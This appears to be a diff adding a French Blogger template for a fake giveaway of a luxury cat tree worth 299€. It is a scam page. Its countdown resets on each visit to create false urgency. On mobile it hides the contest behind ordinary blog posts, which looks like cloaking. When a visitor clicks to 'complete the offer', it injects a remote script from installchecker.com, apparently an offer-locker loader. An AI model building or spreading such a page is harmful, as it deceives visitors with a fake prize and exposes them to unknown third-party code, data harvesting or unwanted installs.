@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="fr" b:version='2' class='v2' expr:dir='data:blog.languageDirection'>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🎁 GAGNEZ un Arbre à Chat de Luxe - GRATUIT</title>
+    <b:include data='blog' name='all-head-content'/>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --primary: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --secondary: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --accent: #ff6b6b;
+            --gold: #ffd700;
+            --text: #2c3e50;
+            --light: #f8f9fa;
+            --shadow: rgba(0,0,0,0.1);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: var(--text);
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            margin: 0;
+            padding: 0;
+            background: #f9f9f9;
+        }
+
+        /* Mobile-First Design */
+        .contest-container {
+            width: 100%;
+            max-width: 100vw;
+            overflow-x: hidden;
+        }
+
+        /* Hero Section - Mobile Optimized */
+        .hero {
+            background: var(--primary);
+            color: white;
+            text-align: center;
+            padding: 2rem 1rem;
+            position: relative;
+            min-height: 80vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="20" cy="20" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="80" cy="80" r="1.5" fill="rgba(255,255,255,0.1)"/><circle cx="40" cy="60" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="90" cy="30" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="10" cy="80" r="1.5" fill="rgba(255,255,255,0.1)"/></svg>');
+            animation: float 20s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 900;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            line-height: 1.2;
+        }
+
+        .hero .subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.95;
+            font-weight: 300;
+        }
+
+        .prize-value {
+            background: var(--gold);
+            color: var(--text);
+            padding: 1rem 2rem;
+            border-radius: 30px;
+            font-size: 1.4rem;
+            font-weight: 800;
+            display: inline-block;
+            margin: 1rem 0 2rem;
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .cta-button {
+            background: var(--secondary);
+            color: white;
+            padding: 1.2rem 2rem;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.4);
+            position: relative;
+            overflow: hidden;
+            width: auto;
+            min-width: 280px;
+            text-align: center;
+            border: 2px solid transparent;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(245, 87, 108, 0.5);
+        }
+
+        .cta-button:active {
+            transform: translateY(-1px);
+        }
+
+        /* Product Showcase - Mobile Grid */
+        .product-showcase {
+            padding: 3rem 1rem;
+            background: var(--light);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            color: var(--text);
+            margin-bottom: 2rem;
+            font-weight: 800;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background: var(--accent);
+            border-radius: 2px;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin-bottom: 2rem;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px var(--shadow);
+            transition: all 0.3s ease;
+            aspect-ratio: 1;
+        }
+
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        .product-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+
+        .product-card:hover .product-image {
+            transform: scale(1.1);
+        }
+
+        /* Features Section */
+        .features {
+            padding: 3rem 1rem;
+            background: white;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .feature-card {
+            text-align: center;
+            padding: 2rem;
+            border-radius: 20px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.2);
+            border-color: rgba(102, 126, 234, 0.3);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        .feature-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 1rem;
+        }
+
+        .feature-description {
+            font-size: 1rem;
+            line-height: 1.6;
+            opacity: 0.8;
+        }
+
+        /* How to Participate */
+        .how-to-participate {
+            padding: 3rem 1rem;
+            background: var(--primary);
+            color: white;
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 2rem;
+            max-width: 600px;
+            margin: 2rem auto 0;
+        }
+
+        .step {
+            text-align: center;
+            padding: 2rem;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .step:hover {
+            background: rgba(255,255,255,0.15);
+            transform: translateY(-5px);
+        }
+
+        .step-number {
+            background: var(--gold);
+            color: var(--text);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 800;
+            margin: 0 auto 1rem;
+            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .step-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .step-description {
+            font-size: 1rem;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        /* Countdown Timer */
+        .countdown-section {
+            padding: 3rem 1rem;
+            background: #1a1a1a;
+            color: white;
+            text-align: center;
+        }
+
+        .countdown-section h2 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            font-weight: 800;
+        }
+
+        .countdown {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1rem;
+            max-width: 400px;
+            margin: 2rem auto 0;
+        }
+
+        .countdown-item {
+            background: var(--accent);
+            padding: 1.5rem 0.5rem;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.4);
+        }
+
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: 800;
+            display: block;
+            line-height: 1;
+        }
+
+        .countdown-label {
+            font-size: 0.8rem;
+            opacity: 0.9;
+            margin-top: 0.5rem;
+            font-weight: 500;
+        }
+
+        /* Final CTA */
+        .final-cta {
+            padding: 3rem 1rem;
+            background: var(--secondary);
+            color: white;
+            text-align: center;
+        }
+
+        .final-cta h2 {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            font-weight: 800;
+            line-height: 1.3;
+        }
+
+        .final-cta .cta-button {
+            background: white;
+            color: var(--text);
+            font-size: 1.2rem;
+            padding: 1.4rem 2rem;
+            margin-top: 1rem;
+            min-width: 320px;
+        }
+
+        /* Mobile Responsive Design */
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+            
+            .hero .subtitle {
+                font-size: 1rem;
+            }
+            
+            .prize-value {
+                font-size: 1.2rem;
+                padding: 0.8rem 1.5rem;
+            }
+            
+            .cta-button {
+                min-width: 260px;
+                font-size: 1rem;
+                padding: 1rem 1.5rem;
+            }
+            
+            .section-title {
+                font-size: 1.6rem;
+            }
+            
+            .countdown-number {
+                font-size: 1.5rem;
+            }
+            
+            .countdown-label {
+                font-size: 0.7rem;
+            }
+        }
+
+        /* Tablet Design */
+        @media (min-width: 768px) {
+            .hero h1 {
+                font-size: 3rem;
+            }
+            
+            .product-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 2rem;
+            }
+            
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 2rem;
+            }
+            
+            .steps {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 2rem;
+            }
+            
+            .countdown {
+                grid-template-columns: repeat(4, 1fr);
+                gap: 2rem;
+                max-width: 500px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .features-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            
+            .steps {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        /* Loading and Success States */
+        .loading-spinner {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 1rem auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            display: none;
+            background: #4CAF50;
+            color: white;
+            padding: 1rem;
+            border-radius: 15px;
+            margin-top: 1rem;
+            font-weight: 600;
+        }
+
+        /* Sparkle Animation */
+        .sparkle {
+            position: fixed;
+            pointer-events: none;
+            z-index: 1000;
+            animation: sparkleAnimation 3s ease-out forwards;
+        }
+
+        @keyframes sparkleAnimation {
+            0% { 
+                opacity: 0; 
+                transform: scale(0) rotate(0deg); 
+            }
+            50% { 
+                opacity: 1; 
+                transform: scale(1) rotate(180deg); 
+            }
+            100% { 
+                opacity: 0; 
+                transform: scale(0) rotate(360deg); 
+            }
+        }
+        
+        /* Blogger Post Container */
+        .blog-posts {
+            display: none;
+            padding: 2rem 1rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Mobile detection and fallback */
+        @media (max-width: 767px) {
+            .blog-posts {
+                display: block !important;
+            }
+            .contest-container {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="contest-container">
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-content">
+                <h1>🎁 CONCOURS EXCEPTIONNEL</h1>
+                <p class="subtitle">Gagnez un Arbre à Chat de Luxe Absolument GRATUIT!</p>
+                <div class="prize-value">
+                    🎁 Valeur: 299€
+                </div>
+                <a href="#participate" class="cta-button">
+                    🚀 PARTICIPER MAINTENANT
+                </a>
+            </div>
+        </section>
+
+        <!-- Product Showcase -->
+        <section class="product-showcase">
+            <h2 class="section-title">🌟 Découvrez Votre Prix</h2>
+            <div class="product-grid">
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1513360371669-4adf3dd7dff8?w=400&h=400&fit=crop" alt="Arbre à chat luxe" class="product-image">
+                </div>
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1574158622682-e40e69881006?w=400&h=400&fit=crop" alt="Arbre à chat design" class="product-image">
+                </div>
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400&h=400&fit=crop" alt="Chat sur arbre" class="product-image">
+                </div>
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1596492784531-6e6eb5ea9993?w=400&h=400&fit=crop" alt="Chat jouant" class="product-image">
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section class="features">
+            <h2 class="section-title">✨ Caractéristiques Exceptionnelles</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🏆</div>
+                    <h3 class="feature-title">Matériaux Premium</h3>
+                    <p class="feature-description">Tissu peluche haut de gamme, doux et élastique pour un confort maximal de votre chat.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <h3 class="feature-title">Griffoir Intégré</h3>
+                    <p class="feature-description">Panneau à griffer à l'arrière pour satisfaire les instincts naturels de votre félin.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">☁️</div>
+                    <h3 class="feature-title">Confort Nuage</h3>
+                    <p class="feature-description">Plateformes et lit moelleux et élastiques offrant un repos paradisiaque à votre compagnon.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">💪</div>
+                    <h3 class="feature-title">Résistance Maximale</h3>
+                    <p class="feature-description">Capacité de charge exceptionnelle, parfait pour les foyers multi-chats.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- How to Participate -->
+        <section class="how-to-participate" id="participate">
+            <h2 class="section-title">🚀 Comment Participer?</h2>
+            <p style="text-align: center; font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.95;">
+                C'est SIMPLE et RAPIDE - seulement 2 minutes!
+            </p>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3 class="step-title">Cliquez sur Participer</h3>
+                    <p class="step-description">Appuyez sur le bouton pour commencer votre participation</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3 class="step-title">Complétez l'Offre</h3>
+                    <p class="step-description">Répondez à quelques questions simples (2 minutes max)</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3 class="step-title">Tirage au Sort</h3>
+                    <p class="step-description">Votre participation est confirmée automatiquement!</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <h3 class="step-title">Livraison Gratuite</h3>
+                    <p class="step-description">Le gagnant reçoit son prix 100% GRATUIT à domicile!</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Countdown Timer -->
+        <section class="countdown-section">
+            <h2>⏰ Temps Limité!</h2>
+            <p>Dépêchez-vous, le concours se termine bientôt!</p>
+            <div class="countdown" id="countdown">
+                <div class="countdown-item">
+                    <span class="countdown-number" id="days">07</span>
+                    <span class="countdown-label">JOURS</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="hours">23</span>
+                    <span class="countdown-label">HEURES</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="minutes">45</span>
+                    <span class="countdown-label">MIN</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="seconds">30</span>
+                    <span class="countdown-label">SEC</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Final CTA -->
+        <section class="final-cta">
+            <h2>🎉 Ne Manquez Pas Cette Chance Unique!</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.95;">
+                Un seul gagnant sera sélectionné - Participez maintenant!
+            </p>
+            <button class="cta-button" onclick="startParticipation(this)">
+                🏆 COMPLÉTER L'OFFRE MAINTENANT
+            </button>
+            <div class="loading-spinner" id="loadingSpinner"></div>
+            <div class="success-message" id="successMessage">
+                🎉 Parfait! Votre participation est en cours...
+            </div>
+        </section>
+    </div>
+
+    <!-- Blog Posts Container (Hidden by default, shown on mobile) -->
+    <div class="blog-posts">
+        <b:section id='main' showaddelement='yes'>
+            <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'/>
+        </b:section>
+    </div>
+
+    <script>
+        // Mobile device detection
+        function isMobileDevice() {
+            return (navigator.userAgent.match(/Android/i)
+                || navigator.userAgent.match(/webOS/i)
+                || navigator.userAgent.match(/iPhone/i)
+                || navigator.userAgent.match(/iPad/i)
+                || navigator.userAgent.match(/iPod/i)
+                || navigator.userAgent.match(/BlackBerry/i)
+                || navigator.userAgent.match(/Windows Phone/i));
+        }
+
+        // Countdown timer
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const endTime = now + (7 * 24 * 60 * 60 * 1000) + (23 * 60 * 60 * 1000) + (45 * 60 * 1000) + (30 * 1000);
+            
+            const countdownInterval = setInterval(() => {
+                const current = new Date().getTime();
+                const timeLeft = endTime - current;
+                
+                if (timeLeft < 0) {
+                    clearInterval(countdownInterval);
+                    return;
+                }
+                
+                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                
+                document.getElementById('days').textContent = days.toString().padStart(2, '0');
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            }, 1000);
+        }
+
+        // Smooth scrolling
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Participation function
+        function startParticipation(button) {
+            const originalText = button.innerHTML;
+            const spinner = document.getElementById('loadingSpinner');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Show loading state
+            button.innerHTML = '⏳ Chargement...';
+            button.disabled = true;
+            spinner.style.display = 'block';
+            
+            // Create and load the script
+            const script = document.createElement('script');
+            script.type = 'text/javascript';
+            script.id = 'ogjs';
+            script.src = 'https://installchecker.com/cl/js/1x5j3e';
+            
+            script.onload = function() {
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    button.innerHTML = '✅ Participation Activée!';
+                    button.style.background = '#4CAF50';
+                }, 2000);
+            };
+            
+            script.onerror = function() {
+                spinner.style.display = 'none';
+                button.innerHTML = originalText;
+                button.disabled = false;
+                alert('Erreur de connexion. Veuillez réessayer.');
+            };
+            
+            document.head.appendChild(script);
+        }
+
+        // Sparkle effects
+        function createSparkle() {
+            const sparkle = document.createElement('div');
+            sparkle.className = 'sparkle';
+            sparkle.innerHTML = '✨';
+            sparkle.style.left = Math.random() * window.innerWidth + 'px';
+            sparkle.style.top = Math.random() * window.innerHeight + 'px';
+            sparkle.style.fontSize = (Math.random() * 20 + 15) + 'px';
+            
+            document.body.appendChild(sparkle);
+            
+            setTimeout(() => {
+                if (sparkle.parentNode) {
+                    sparkle.parentNode.removeChild(sparkle);
+                }
+            }, 3000);
+        }
+
+        // Initialize everything
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if mobile device
+            if (isMobileDevice()) {
+                document.querySelector('.contest-container').style.display = 'none';
+                document.querySelector('.blog-posts').style.display = 'block';
+            } else {
+                document.querySelector('.contest-container').style.display = 'block';
+                document.querySelector('.blog-posts').style.display = 'none';
+                updateCountdown();
+                
+                // Create sparkles periodically
+                setInterval(createSparkle, 3000);
+            }
+            
+            // Prevent double-tap zoom on mobile
+            let lastTouchEnd = 0;
+            document.addEventListener('touchend', function (event) {
+                const now = (new Date()).getTime();
+                if (now - lastTouchEnd <= 300) {
+                    event.preventDefault();
+                }
+                lastTouchEnd = now;
+            }, false);
+        });
+    </script>
+</body>
+</html>
